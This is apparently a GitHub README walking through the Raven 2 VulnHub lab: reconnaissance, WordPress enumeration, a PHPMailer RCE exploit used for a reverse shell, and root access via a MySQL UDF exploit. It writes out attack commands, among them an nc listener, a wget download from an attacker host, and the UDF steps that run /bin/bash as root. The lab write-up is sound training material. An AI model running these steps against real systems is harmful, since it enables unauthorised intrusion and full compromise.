https://github.com/tejasbudhbawre/raven2-vulnhub-walkthrough
# Raven2-vulnhub-walkthrough
GitHub README (Professional Walkthrough)


Raven 2 VulnHub Walkthrough | Web Exploitation + Privilege Escalation

📖 Description

This repository contains a complete walkthrough of the Raven 2 machine from VulnHub. The challenge focuses on web exploitation, credential harvesting, and privilege escalation.

🛠️ Tools Used
Nmap
Gobuster / Dirsearch
Wpscan
Netcat
Searchsploit
Linux Privilege Escalation Techniques
🌐 Step 1: Reconnaissance
The First Step while solving any machine is connectivity for that using MAC address I find the IP of VM.
![Recon](./1.png)

## IP FOUND (Target Machine): 192.168.152.136
Started with an Nmap scan:

## 🔍 Nmap Scan Results

![Nmap Scan](./2.png)
nmap -sV -sS -A -O 192.168.152.136

An aggressive Nmap scan (-sV -A -sS) was performed on the target machine.

### Key Findings:
- **22/tcp (SSH)** → OpenSSH 6.7p1 (Debian)
- **80/tcp (HTTP)** → Apache 2.4.10 (Debian)
- **111/tcp (RPCBind)** → RPC service enabled

The presence of an HTTP service suggests a potential web-based attack surface, making it the primary entry point for further enumeration.

📂 Step 2:
## 🌐 Web Vulnerability Scan (Nikto)
nikto -h http://192.168.152.136
![Nikto Scan](./3.png)
![Nikto Scan](./4.png)


A Nikto scan was performed on the web server to identify misconfigurations and potential vulnerabilities.

### Key Findings:

- ❌ Missing Security Headers:
  - Content-Security-Policy
  - Strict-Transport-Security
  - X-Content-Type-Options
  - Permissions-Policy
  - Referrer-Policy

- 📂 Directory Indexing Enabled:
  - /css/
  - /img/
  - /manual/
  - /wordpress/wp-content/uploads/

- ⚠️ Sensitive Information Exposure:
  - `/wordpress/wp-links-opml.php` reveals WordPress version
  - `.DS_Store` file accessible (information disclosure)

- 🔐 WordPress Identified:
  - `/wordpress/` directory discovered
  - `/wp-login.php` login panel found
  - WordPress cookies without HttpOnly flag

### Conclusion:
The web server is misconfigured with multiple security issues and exposes a **WordPress application**, making it a primary attack surface.

Exploring the Directories identifiend in the nikto scan 
## 📂 Directory Exploration

![Directory Enumeration](./5.png)
![Directory Enumeration](./6.png)
![Directory Enumeration](./7.png)
![Directory Enumeration](./8.png)
![Directory Enumeration](./9.png)

Based on the Nikto scan results, several directories with indexing enabled were identified. These directories were manually explored to uncover sensitive information and hidden resources.

### 🔍 Key Observations:

- **/css/** and **/img/**
  - Publicly accessible directories
  - Confirmed directory indexing enabled
  - Potential for information disclosure

- **/manual/**
  - Apache default documentation exposed
  - Can reveal server configuration details

- **/wordpress/**
  - WordPress installation identified
  - Further attack surface discovered

- **/wordpress/wp-content/uploads/**
  - Browsable uploads directory
  - May contain sensitive files or user uploads

### 🚨 Security Impact:
- Directory indexing allows attackers to browse internal files
- Exposed uploads can lead to **file disclosure or malicious file execution**
- WordPress directory confirms a **CMS-based attack vector**
## Wordpress Enumration using WPSCAN
## 🔐 WordPress Enumeration

![WordPress Enumeration](./10.png)
![WordPress Enumeration](./11.png)
![WordPress Enumeration](./12.png)
![WordPress Enumeration](./13.png)
![WordPress Enumeration](./14.png)
![WordPress Enumeration](./15.png)
![WordPress Enumeration](./16.png)
![WordPress Enumeration](./17.png)

✅ Discovered valid users:
michael
steven
🚩 Flag 3 Discovered
Location: /wordpress/wp-content/uploads/2018/11/flag3.png
Indicates exposed upload directory and poor access control
📂 Uploads Directory Browsable
/wp-content/uploads/
Sensitive files publicly accessible

After identifying the WordPress installation, further enumeration was performed using automated and manual techniques.

### 🔍 Key Findings:

- 🔑 **Login Panel Identified**
  - `/wordpress/wp-login.php`

- 👤 **User Enumeration (WPScan)**
bash
wpscan -u http://<TARGET_IP>/wordpress -e u


gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
![gobuster Enumeration](./18.png)
![gobuster Enumeration](./19.png)
![gobuster Enumeration](./20.png)
![gobuster Enumeration](./21.png)
![gobuster Enumeration](./22.png)


## 🚩 Sensitive File Discovery & Vulnerability Identification

During directory exploration, a hidden path was discovered:

- `/vendor/PATH/`

### 🔍 Key Findings:

- 🚩 **Flag 2 discovered** inside the vendor directory
- ⚠️ Application running on **PHP 5.2.16**
- 📉 This PHP version is outdated and known to be vulnerable to **Remote Code Execution (RCE)**

### 🚨 Security Impact:

- The `/vendor/` directory should not be publicly accessible
- Exposure of internal application files indicates poor security configuration
- PHP 5.2.16 is deprecated and contains multiple critical vulnerabilities that can be exploited for remote code execution

### ➡️ Next Step:

Based on the outdated PHP version, the focus shifted to:
- Searching for public exploits
- Attempting RCE to gain initial shell access

 
🔐 Step 3: Web Exploitation

Identified WordPress-based application.

Enumerated users
Found login panel

## 💥 Remote Code Execution (PHPMailer Exploit)

During enumeration, it was identified that the application is running:

- **PHP Version:** 5.2.16 (outdated & vulnerable)
- **Contact Form:** vulnerable to PHP Mailer exploit

### 🔍 Vulnerability Identified:

The contact form uses a vulnerable version of **PHPMailer**, which is susceptible to **Remote Code Execution (RCE)**.

### 🧠 Exploit Research:

## 💥 Exploitation (PHPMailer RCE → Shell Access)

![Searchsploit](./23.png)

After identifying the vulnerable PHPMailer version, I searched for available exploits:


searchsploit phpmailer
An exploit script (40974.py) was found, which targets command injection in PHPMailer.

🛠️ Exploit Modification

The exploit script was modified to:

Set attacker IP and port
Adjust payload for reverse shell
Match target parameters


The contact form request was intercepted using DEv Tools to:
** You can also used The burpsuite for request capturing **

Understand parameters (name, email, message)
Inject malicious payload correctly
🐚 Gaining Shell Access
The exploit was executed:

python 40974.py

A reverse shell was successfully obtained using Netcat:

nc -lvnp 4444


Once inside the system:

Navigated through directories
Identified WordPress installation files
Explored configuration files
![Shell](./24.png)
![Shell](./25.png)
![Shell](./26.png)
![Shell](./27.png)
![Shell](./28.png)
![Shell](./29.png)
![Shell](./30.png)
![Shell](./31.png)

Credential Discovery

Located sensitive file:

wp-config.php

Extracted database credentials:

Username: (found in config)
Password: (found in config)

## 🔓 Privilege Escalation (LinEnum)

After gaining initial shell access, the next step was to identify potential privilege escalation vectors.

### 🛠️ Tool Used: LinEnum
![Shell](./32.png)
 You can download it using
 git clone https://github.com/rebootuser/LinEnum.git
 cd LinEnu
 
**LinEnum** is a Linux enumeration script used for:
- Identifying misconfigurations  
- Finding sensitive files  
- Detecting privilege escalation vectors
- ![Shell](./33.png)

🚀 Transfer to Target Machine

On attacker machine:

python3 -m http.server 8000

On target machine:

wget http://<ATTACKER_IP>:8000/LinEnum.sh
⚙️ Execute LinEnum
chmod +x LinEnum.sh
./LinEnum.sh
![Shell](./34.png)

![Shell](./35.png)

In linux enumeration output i found that the mysql service on 3306 port runnign and have a mysql credentials
![Shell](./37.png)
 ## 🚀 Privilege Escalation (MySQL UDF Exploit - EDB 1518)

After gaining access to MySQL using credentials from `wp-config.php`, the next step was to escalate privileges.

### 🔍 Vulnerability Identified:

- MySQL service was running locally (Port 3306)
- MySQL version vulnerable to **User Defined Function (UDF) exploitation**
- MySQL running with high privileges (possible root execution)

---

### 🧠 Exploit Research

Used Exploit-DB:

🔗 https://www.exploit-db.com/exploits/1518

This exploit abuses MySQL's **User Defined Function (UDF)** feature to execute system-level commands.

👉 It allows attackers to execute commands like:
sql
1️⃣ Download Exploit
searchsploit -m 1518.c
2️⃣ Compile Exploit
gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.c -lc
3️⃣ Upload to Target

Transfer the .so file to the target machine.

4️⃣ Create UDF in MySQL
CREATE FUNCTION sys_exec RETURNS INT SONAME '1518.so';
5️⃣ Execute Commands as Root
SELECT sys_exec('/bin/bash');
🐚 Root Access Achieved

![Shell](./39.png)

![Shell](./40.png)

![Shell](./41.png)

🚨 Security Impact
MySQL misconfiguration → Privilege Escalation
UDF exploitation → Command execution as root
Complete system compromise
This resulted in a root shell, giving full control over the system.
🏁 Final Result
User Access ✅
Shell Access ✅
Database Access ✅
Root Access ✅

Abusing MySQL UDF functionality transformed database access into full root-level system compromise.


📚 Key Learnings
WordPress enumeration techniques
Exploiting vulnerable PHP mail forms
Reverse shell handling
Credential harvesting
Linux privilege escalation
## 🧾 Conclusion

The Raven 2 machine demonstrates how multiple low-to-medium severity misconfigurations can be chained together to achieve full system compromise.

Starting from basic reconnaissance, the attack progressed through:
- Web application enumeration
- WordPress user discovery
- Exploitation of a vulnerable PHPMailer implementation
- Reverse shell access
- Credential harvesting from configuration files
- Privilege escalation via MySQL UDF exploitation

This highlights the importance of:
- Keeping software (like PHP) updated  
- Securing sensitive directories (e.g., /vendor/, /uploads/)  
- Proper input validation in web forms  
- Avoiding credential reuse across services  
- Restricting database-level privileges  

Overall, the machine provides a realistic demonstration of how attackers think and how small security gaps can lead to complete system compromise.
